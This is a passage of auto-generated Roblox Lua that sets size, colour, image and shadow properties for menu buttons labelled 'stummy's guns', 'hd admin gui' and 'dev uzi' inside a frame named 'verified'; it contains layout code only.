G2L["214"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["214"].Rotation = 0
G2L["214"].Selectable = true
G2L["214"].SelectionOrder = 0
G2L["214"].Size = UDim2.new(1, 0, 1, 0)
G2L["214"].Visible = true
G2L["214"].ZIndex = 1
G2L["214"].Parent = G2L["213"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.RippleClick
G2L["215"].Name = [[RippleClick]]
G2L["215"].Parent = G2L["213"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.RippleClick.Circle
G2L["216"].Name = [[Circle]]
G2L["216"].Image = [[rbxassetid://266543268]]
G2L["216"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["216"].ScaleType = Enum.ScaleType.Stretch
G2L["216"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["216"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["216"].Active = false
G2L["216"].AnchorPoint = Vector2.new(0, 0)
G2L["216"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["216"].BackgroundTransparency = 1
G2L["216"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["216"].BorderSizePixel = 1
G2L["216"].ClipsDescendants = false
G2L["216"].Draggable = false
G2L["216"].Position = UDim2.new(0, 0, 0, 0)
G2L["216"].Rotation = 0
G2L["216"].Selectable = false
G2L["216"].SelectionOrder = 0
G2L["216"].Size = UDim2.new(0, 0, 0, 0)
G2L["216"].Visible = true
G2L["216"].ZIndex = 10
G2L["216"].Parent = G2L["215"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.UICorner
G2L["217"].Name = [[UICorner]]
G2L["217"].CornerRadius = UDim.new(0, 10)
G2L["217"].Parent = G2L["213"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.ServerEventHandler
G2L["218"].Name = [[ServerEventHandler]]
G2L["218"].Parent = G2L["213"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder
G2L["219"].Name = [[shadowHolder]]
G2L["219"].Active = false
G2L["219"].AnchorPoint = Vector2.new(0, 0)
G2L["219"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["219"].BackgroundTransparency = 1
G2L["219"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["219"].BorderSizePixel = 1
G2L["219"].ClipsDescendants = false
G2L["219"].Draggable = false
G2L["219"].Position = UDim2.new(0, 0, 0, 0)
G2L["219"].Rotation = 0
G2L["219"].Selectable = false
G2L["219"].SelectionOrder = 0
G2L["219"].Size = UDim2.new(1, 0, 1, 0)
G2L["219"].Visible = true
G2L["219"].ZIndex = -1
G2L["219"].Parent = G2L["213"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.umbraShadow
G2L["220"].Name = [[umbraShadow]]
G2L["220"].Image = [[rbxassetid://1316045217]]
G2L["220"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["220"].ScaleType = Enum.ScaleType.Slice
G2L["220"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["220"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["220"].Active = false
G2L["220"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["220"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["220"].BackgroundTransparency = 1
G2L["220"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["220"].BorderSizePixel = 1
G2L["220"].ClipsDescendants = false
G2L["220"].Draggable = false
G2L["220"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["220"].Rotation = 0
G2L["220"].Selectable = false
G2L["220"].SelectionOrder = 0
G2L["220"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["220"].Visible = true
G2L["220"].ZIndex = 1
G2L["220"].Parent = G2L["219"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.penumbraShadow
G2L["221"].Name = [[penumbraShadow]]
G2L["221"].Image = [[rbxassetid://1316045217]]
G2L["221"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["221"].ScaleType = Enum.ScaleType.Slice
G2L["221"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["221"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["221"].Active = false
G2L["221"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["221"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["221"].BackgroundTransparency = 1
G2L["221"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["221"].BorderSizePixel = 1
G2L["221"].ClipsDescendants = false
G2L["221"].Draggable = false
G2L["221"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["221"].Rotation = 0
G2L["221"].Selectable = false
G2L["221"].SelectionOrder = 0
G2L["221"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["221"].Visible = true
G2L["221"].ZIndex = 1
G2L["221"].Parent = G2L["219"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.shadowHolder.ambientShadow
G2L["222"].Name = [[ambientShadow]]
G2L["222"].Image = [[rbxassetid://1316045217]]
G2L["222"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["222"].ScaleType = Enum.ScaleType.Slice
G2L["222"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["222"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["222"].Active = false
G2L["222"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["222"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["222"].BackgroundTransparency = 1
G2L["222"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["222"].BorderSizePixel = 1
G2L["222"].ClipsDescendants = false
G2L["222"].Draggable = false
G2L["222"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["222"].Rotation = 0
G2L["222"].Selectable = false
G2L["222"].SelectionOrder = 0
G2L["222"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["222"].Visible = true
G2L["222"].ZIndex = 1
G2L["222"].Parent = G2L["219"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns
G2L["223"].Name = [[stummy's meepcity guns]]
G2L["223"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["223"].Text = [[stummy's meepcity guns]]
G2L["223"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["223"].TextScaled = true
G2L["223"].TextSize = 14
G2L["223"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["223"].TextStrokeTransparency = 1
G2L["223"].TextWrapped = true
G2L["223"].TextXAlignment = Enum.TextXAlignment.Center
G2L["223"].TextYAlignment = Enum.TextYAlignment.Center
G2L["223"].Active = true
G2L["223"].AnchorPoint = Vector2.new(0, 0)
G2L["223"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["223"].BackgroundTransparency = 0.5
G2L["223"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["223"].BorderSizePixel = 0
G2L["223"].ClipsDescendants = false
G2L["223"].Draggable = false
G2L["223"].Position = UDim2.new(0, 0, 0, 0)
G2L["223"].Rotation = 0
G2L["223"].Selectable = true
G2L["223"].SelectionOrder = 0
G2L["223"].Size = UDim2.new(0, 200, 0, 50)
G2L["223"].Visible = true
G2L["223"].ZIndex = 1
G2L["223"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.TextButton_Roundify_12px
G2L["224"].Name = [[TextButton_Roundify_12px]]
G2L["224"].Image = [[rbxassetid://3570695787]]
G2L["224"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["224"].ScaleType = Enum.ScaleType.Slice
G2L["224"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["224"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["224"].Active = true
G2L["224"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["224"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["224"].BackgroundTransparency = 1
G2L["224"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["224"].BorderSizePixel = 1
G2L["224"].ClipsDescendants = false
G2L["224"].Draggable = false
G2L["224"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["224"].Rotation = 0
G2L["224"].Selectable = true
G2L["224"].SelectionOrder = 0
G2L["224"].Size = UDim2.new(1, 0, 1, 0)
G2L["224"].Visible = true
G2L["224"].ZIndex = 1
G2L["224"].Parent = G2L["223"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.RippleClick
G2L["225"].Name = [[RippleClick]]
G2L["225"].Parent = G2L["223"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.RippleClick.Circle
G2L["226"].Name = [[Circle]]
G2L["226"].Image = [[rbxassetid://266543268]]
G2L["226"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["226"].ScaleType = Enum.ScaleType.Stretch
G2L["226"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["226"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["226"].Active = false
G2L["226"].AnchorPoint = Vector2.new(0, 0)
G2L["226"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["226"].BackgroundTransparency = 1
G2L["226"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["226"].BorderSizePixel = 1
G2L["226"].ClipsDescendants = false
G2L["226"].Draggable = false
G2L["226"].Position = UDim2.new(0, 0, 0, 0)
G2L["226"].Rotation = 0
G2L["226"].Selectable = false
G2L["226"].SelectionOrder = 0
G2L["226"].Size = UDim2.new(0, 0, 0, 0)
G2L["226"].Visible = true
G2L["226"].ZIndex = 10
G2L["226"].Parent = G2L["225"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.UICorner
G2L["227"].Name = [[UICorner]]
G2L["227"].CornerRadius = UDim.new(0, 10)
G2L["227"].Parent = G2L["223"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.ServerEventHandler
G2L["228"].Name = [[ServerEventHandler]]
G2L["228"].Parent = G2L["223"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder
G2L["229"].Name = [[shadowHolder]]
G2L["229"].Active = false
G2L["229"].AnchorPoint = Vector2.new(0, 0)
G2L["229"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["229"].BackgroundTransparency = 1
G2L["229"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["229"].BorderSizePixel = 1
G2L["229"].ClipsDescendants = false
G2L["229"].Draggable = false
G2L["229"].Position = UDim2.new(0, 0, 0, 0)
G2L["229"].Rotation = 0
G2L["229"].Selectable = false
G2L["229"].SelectionOrder = 0
G2L["229"].Size = UDim2.new(1, 0, 1, 0)
G2L["229"].Visible = true
G2L["229"].ZIndex = -1
G2L["229"].Parent = G2L["223"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.umbraShadow
G2L["230"].Name = [[umbraShadow]]
G2L["230"].Image = [[rbxassetid://1316045217]]
G2L["230"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["230"].ScaleType = Enum.ScaleType.Slice
G2L["230"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["230"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["230"].Active = false
G2L["230"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["230"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["230"].BackgroundTransparency = 1
G2L["230"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["230"].BorderSizePixel = 1
G2L["230"].ClipsDescendants = false
G2L["230"].Draggable = false
G2L["230"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["230"].Rotation = 0
G2L["230"].Selectable = false
G2L["230"].SelectionOrder = 0
G2L["230"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["230"].Visible = true
G2L["230"].ZIndex = 1
G2L["230"].Parent = G2L["229"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.penumbraShadow
G2L["231"].Name = [[penumbraShadow]]
G2L["231"].Image = [[rbxassetid://1316045217]]
G2L["231"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["231"].ScaleType = Enum.ScaleType.Slice
G2L["231"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["231"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["231"].Active = false
G2L["231"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["231"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["231"].BackgroundTransparency = 1
G2L["231"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["231"].BorderSizePixel = 1
G2L["231"].ClipsDescendants = false
G2L["231"].Draggable = false
G2L["231"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["231"].Rotation = 0
G2L["231"].Selectable = false
G2L["231"].SelectionOrder = 0
G2L["231"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["231"].Visible = true
G2L["231"].ZIndex = 1
G2L["231"].Parent = G2L["229"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's meepcity guns.shadowHolder.ambientShadow
G2L["232"].Name = [[ambientShadow]]
G2L["232"].Image = [[rbxassetid://1316045217]]
G2L["232"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["232"].ScaleType = Enum.ScaleType.Slice
G2L["232"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["232"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["232"].Active = false
G2L["232"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["232"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["232"].BackgroundTransparency = 1
G2L["232"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["232"].BorderSizePixel = 1
G2L["232"].ClipsDescendants = false
G2L["232"].Draggable = false
G2L["232"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["232"].Rotation = 0
G2L["232"].Selectable = false
G2L["232"].SelectionOrder = 0
G2L["232"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["232"].Visible = true
G2L["232"].ZIndex = 1
G2L["232"].Parent = G2L["229"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui
G2L["233"].Name = [[hd admin gui]]
G2L["233"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["233"].Text = [[hd admin gui]]
G2L["233"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["233"].TextScaled = true
G2L["233"].TextSize = 14
G2L["233"].TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
G2L["233"].TextStrokeTransparency = 1
G2L["233"].TextWrapped = true
G2L["233"].TextXAlignment = Enum.TextXAlignment.Center
G2L["233"].TextYAlignment = Enum.TextYAlignment.Center
G2L["233"].Active = true
G2L["233"].AnchorPoint = Vector2.new(0, 0)
G2L["233"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["233"].BackgroundTransparency = 0.5
G2L["233"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["233"].BorderSizePixel = 1
G2L["233"].ClipsDescendants = false
G2L["233"].Draggable = false
G2L["233"].Position = UDim2.new(0, 0, 0, 0)
G2L["233"].Rotation = 0
G2L["233"].Selectable = true
G2L["233"].SelectionOrder = 0
G2L["233"].Size = UDim2.new(0, 100, 0, 67)
G2L["233"].Visible = true
G2L["233"].ZIndex = 1
G2L["233"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.UICorner
G2L["234"].Name = [[UICorner]]
G2L["234"].CornerRadius = UDim.new(0, 8)
G2L["234"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.TextButton_Roundify_12px
G2L["235"].Name = [[TextButton_Roundify_12px]]
G2L["235"].Image = [[rbxassetid://3570695787]]
G2L["235"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["235"].ScaleType = Enum.ScaleType.Slice
G2L["235"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["235"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["235"].Active = true
G2L["235"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["235"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["235"].BackgroundTransparency = 1
G2L["235"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["235"].BorderSizePixel = 1
G2L["235"].ClipsDescendants = false
G2L["235"].Draggable = false
G2L["235"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["235"].Rotation = 0
G2L["235"].Selectable = true
G2L["235"].SelectionOrder = 0
G2L["235"].Size = UDim2.new(1, 0, 1, 0)
G2L["235"].Visible = true
G2L["235"].ZIndex = 1
G2L["235"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder
G2L["236"].Name = [[shadowHolder]]
G2L["236"].Active = false
G2L["236"].AnchorPoint = Vector2.new(0, 0)
G2L["236"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["236"].BackgroundTransparency = 1
G2L["236"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["236"].BorderSizePixel = 1
G2L["236"].ClipsDescendants = false
G2L["236"].Draggable = false
G2L["236"].Position = UDim2.new(0, 0, 0, 0)
G2L["236"].Rotation = 0
G2L["236"].Selectable = false
G2L["236"].SelectionOrder = 0
G2L["236"].Size = UDim2.new(1, 0, 1, 0)
G2L["236"].Visible = true
G2L["236"].ZIndex = -1
G2L["236"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.umbraShadow
G2L["237"].Name = [[umbraShadow]]
G2L["237"].Image = [[rbxassetid://1316045217]]
G2L["237"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["237"].ScaleType = Enum.ScaleType.Slice
G2L["237"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["237"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["237"].Active = false
G2L["237"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["237"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["237"].BackgroundTransparency = 1
G2L["237"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["237"].BorderSizePixel = 1
G2L["237"].ClipsDescendants = false
G2L["237"].Draggable = false
G2L["237"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["237"].Rotation = 0
G2L["237"].Selectable = false
G2L["237"].SelectionOrder = 0
G2L["237"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["237"].Visible = true
G2L["237"].ZIndex = 1
G2L["237"].Parent = G2L["236"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.penumbraShadow
G2L["238"].Name = [[penumbraShadow]]
G2L["238"].Image = [[rbxassetid://1316045217]]
G2L["238"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["238"].ScaleType = Enum.ScaleType.Slice
G2L["238"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["238"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["238"].Active = false
G2L["238"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["238"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["238"].BackgroundTransparency = 1
G2L["238"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["238"].BorderSizePixel = 1
G2L["238"].ClipsDescendants = false
G2L["238"].Draggable = false
G2L["238"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["238"].Rotation = 0
G2L["238"].Selectable = false
G2L["238"].SelectionOrder = 0
G2L["238"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["238"].Visible = true
G2L["238"].ZIndex = 1
G2L["238"].Parent = G2L["236"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.shadowHolder.ambientShadow
G2L["239"].Name = [[ambientShadow]]
G2L["239"].Image = [[rbxassetid://1316045217]]
G2L["239"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["239"].ScaleType = Enum.ScaleType.Slice
G2L["239"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["239"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["239"].Active = false
G2L["239"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["239"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["239"].BackgroundTransparency = 1
G2L["239"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["239"].BorderSizePixel = 1
G2L["239"].ClipsDescendants = false
G2L["239"].Draggable = false
G2L["239"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["239"].Rotation = 0
G2L["239"].Selectable = false
G2L["239"].SelectionOrder = 0
G2L["239"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["239"].Visible = true
G2L["239"].ZIndex = 1
G2L["239"].Parent = G2L["236"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.Script
G2L["240"].Name = [[Script]]
G2L["240"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.LocalScript
G2L["241"].Name = [[LocalScript]]
G2L["241"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.hd admin gui.RemoteEvent
G2L["242"].Name = [[RemoteEvent]]
G2L["242"].Parent = G2L["233"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi
G2L["243"].Name = [[dev uzi]]
G2L["243"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["243"].Text = [[dev uzi]]
G2L["243"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["243"].TextScaled = true
G2L["243"].TextSize = 14
G2L["243"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["243"].TextStrokeTransparency = 1
G2L["243"].TextWrapped = true
G2L["243"].TextXAlignment = Enum.TextXAlignment.Center
G2L["243"].TextYAlignment = Enum.TextYAlignment.Center
G2L["243"].Active = true
G2L["243"].AnchorPoint = Vector2.new(0, 0)
G2L["243"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["243"].BackgroundTransparency = 0.5
G2L["243"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["243"].BorderSizePixel = 0
G2L["243"].ClipsDescendants = false
G2L["243"].Draggable = false
G2L["243"].Position = UDim2.new(0, 0, 0, 0)
G2L["243"].Rotation = 0
G2L["243"].Selectable = true
G2L["243"].SelectionOrder = 0
G2L["243"].Size = UDim2.new(0, 200, 0, 50)
G2L["243"].Visible = true
G2L["243"].ZIndex = 1
G2L["243"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.TextButton_Roundify_12px
G2L["244"].Name = [[TextButton_Roundify_12px]]
G2L["244"].Image = [[rbxassetid://3570695787]]
G2L["244"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["244"].ScaleType = Enum.ScaleType.Slice
G2L["244"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["244"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["244"].Active = true
G2L["244"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["244"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["244"].BackgroundTransparency = 1
G2L["244"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["244"].BorderSizePixel = 1
G2L["244"].ClipsDescendants = false
G2L["244"].Draggable = false
G2L["244"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["244"].Rotation = 0
G2L["244"].Selectable = true
G2L["244"].SelectionOrder = 0
G2L["244"].Size = UDim2.new(1, 0, 1, 0)
G2L["244"].Visible = true
G2L["244"].ZIndex = 1
G2L["244"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RippleClick
G2L["245"].Name = [[RippleClick]]
G2L["245"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.RippleClick.Circle
G2L["246"].Name = [[Circle]]
G2L["246"].Image = [[rbxassetid://266543268]]
G2L["246"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["246"].ScaleType = Enum.ScaleType.Stretch
G2L["246"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["246"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["246"].Active = false
G2L["246"].AnchorPoint = Vector2.new(0, 0)
G2L["246"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["246"].BackgroundTransparency = 1
G2L["246"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["246"].BorderSizePixel = 1
G2L["246"].ClipsDescendants = false
G2L["246"].Draggable = false
G2L["246"].Position = UDim2.new(0, 0, 0, 0)
G2L["246"].Rotation = 0
G2L["246"].Selectable = false
G2L["246"].SelectionOrder = 0
G2L["246"].Size = UDim2.new(0, 0, 0, 0)
G2L["246"].Visible = true
G2L["246"].ZIndex = 10
G2L["246"].Parent = G2L["245"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.UICorner
G2L["247"].Name = [[UICorner]]
G2L["247"].CornerRadius = UDim.new(0, 10)
G2L["247"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder
G2L["248"].Name = [[shadowHolder]]
G2L["248"].Active = false
G2L["248"].AnchorPoint = Vector2.new(0, 0)
G2L["248"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["248"].BackgroundTransparency = 1
G2L["248"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["248"].BorderSizePixel = 1
G2L["248"].ClipsDescendants = false
G2L["248"].Draggable = false
G2L["248"].Position = UDim2.new(0, 0, 0, 0)
G2L["248"].Rotation = 0
G2L["248"].Selectable = false
G2L["248"].SelectionOrder = 0
G2L["248"].Size = UDim2.new(1, 0, 1, 0)
G2L["248"].Visible = true
G2L["248"].ZIndex = -1
G2L["248"].Parent = G2L["243"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.umbraShadow
G2L["249"].Name = [[umbraShadow]]
G2L["249"].Image = [[rbxassetid://1316045217]]
G2L["249"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["249"].ScaleType = Enum.ScaleType.Slice
G2L["249"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["249"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["249"].Active = false
G2L["249"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["249"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["249"].BackgroundTransparency = 1
G2L["249"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["249"].BorderSizePixel = 1
G2L["249"].ClipsDescendants = false
G2L["249"].Draggable = false
G2L["249"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["249"].Rotation = 0
G2L["249"].Selectable = false
G2L["249"].SelectionOrder = 0
G2L["249"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["249"].Visible = true
G2L["249"].ZIndex = 1
G2L["249"].Parent = G2L["248"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.penumbraShadow
G2L["250"].Name = [[penumbraShadow]]
G2L["250"].Image = [[rbxassetid://1316045217]]
G2L["250"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["250"].ScaleType = Enum.ScaleType.Slice
G2L["250"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["250"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["250"].Active = false
G2L["250"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["250"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["250"].BackgroundTransparency = 1
G2L["250"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["250"].BorderSizePixel = 1
G2L["250"].ClipsDescendants = false
G2L["250"].Draggable = false
G2L["250"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["250"].Rotation = 0
G2L["250"].Selectable = false
G2L["250"].SelectionOrder = 0
G2L["250"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["250"].Visible = true
G2L["250"].ZIndex = 1
G2L["250"].Parent = G2L["248"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.dev uzi.shadowHolder.ambientShadow
G2L["251"].Name = [[ambientShadow]]
G2L["251"].Image = [[rbxassetid://1316045217]]
G2L["251"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["251"].ScaleType = Enum.ScaleType.Slice
